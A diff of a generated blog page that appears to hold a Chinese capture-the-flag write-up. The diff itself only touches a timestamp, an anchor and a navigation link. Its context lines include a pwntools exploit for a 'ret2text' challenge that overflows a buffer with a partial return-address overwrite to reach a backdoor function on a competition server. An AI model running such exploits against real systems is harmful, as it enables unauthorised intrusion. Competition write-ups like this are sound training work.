@@ -18,7 +18,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="c:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231029221238038.png">
 <meta property="article:published_time" content="2023-10-08T13:14:04.000Z">
-<meta property="article:modified_time" content="2023-11-03T14:44:39.233Z">
+<meta property="article:modified_time" content="2023-12-18T05:33:33.834Z">
 <meta property="article:author" content="wuming">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="c:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231029221238038.png">
@@ -209,7 +209,7 @@
 <h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>PIE手动爆破,填充数据不是0x50</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"><span class="comment"># r = gdb.debug(&#x27;./ret2text&#x27;)</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./ret2text&#x27;)</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;pwn.node.game.sycsec.com&#x27;</span>,<span class="number">31949</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&#x27;ret2text&#x27;</span>)</span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">lic 	= <span class="keyword">lambda</span> data               :uu64(ru(data)[-<span class="number">6</span>:])</span><br><span class="line">padding = <span class="keyword">lambda</span> lenth              :<span class="string">b&#x27;Yhuan&#x27;</span>*(lenth//<span class="number">5</span>)+<span class="string">b&#x27;Y&#x27;</span>*(lenth % <span class="number">5</span>)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :r.interactive()</span><br><span class="line"></span><br><span class="line">pad = p64(<span class="number">0</span>)*<span class="number">9</span> + p64(<span class="number">1</span>)</span><br><span class="line">backdoor = <span class="string">b&#x27;\x27\xA2&#x27;</span></span><br><span class="line"></span><br><span class="line">pl1 = pad + p64(<span class="number">0</span>) + backdoor</span><br><span class="line">se(pl1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-
+<span id="more"></span> 
 
 
 
@@ -296,15 +296,6 @@
   
     
 <nav id="article-nav">
-  
-    <a href="/2023/10/10/moectf/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">&lt;</strong>
-      <div class="article-nav-title">
-        
-          moectf
-        
-      </div>
-    </a>
   
   
     <a href="/2023/10/02/SHCTF/" id="article-nav-older" class="article-nav-link-wrap">
